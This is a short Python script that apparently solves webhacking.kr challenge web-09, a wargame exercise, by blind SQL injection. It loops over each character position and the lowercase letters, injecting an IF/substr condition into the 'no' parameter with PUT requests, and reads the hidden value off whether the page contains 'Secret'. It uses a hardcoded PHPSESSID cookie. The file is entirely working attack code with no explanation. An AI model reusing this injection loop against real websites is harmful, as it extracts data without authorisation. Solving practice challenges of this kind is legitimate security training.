import re, urllib
import urllib.request

pwLength = 11
passwd = ""
SESSION = "8ihe8o1fc1n549jktq4pgnd616"
baseUrl = "http://webhacking.kr/challenge/web/web-09/index.php?no="

for j in range(1,pwLength+1):
	for i in range(97, 123):
		url = baseUrl + "IF((substr(id,%s,1)IN(%s)),3,0)" % (str(j), str(hex(i)))
		#print(url)
		req = urllib.request.Request(url)
		req.get_method = lambda: 'PUT'
		req.add_header('Cookie',"PHPSESSID=8ihe8o1fc1n549jktq4pgnd616")
		read = urllib.request.urlopen(req).read()
		#print(read)
		findrows = re.compile(b'Secret')
		ok = re.findall(findrows,read)
		if ok:
			passwd = passwd + chr(i)
			print(chr(i))
			break
		
	
print("result : %s" % (passwd))

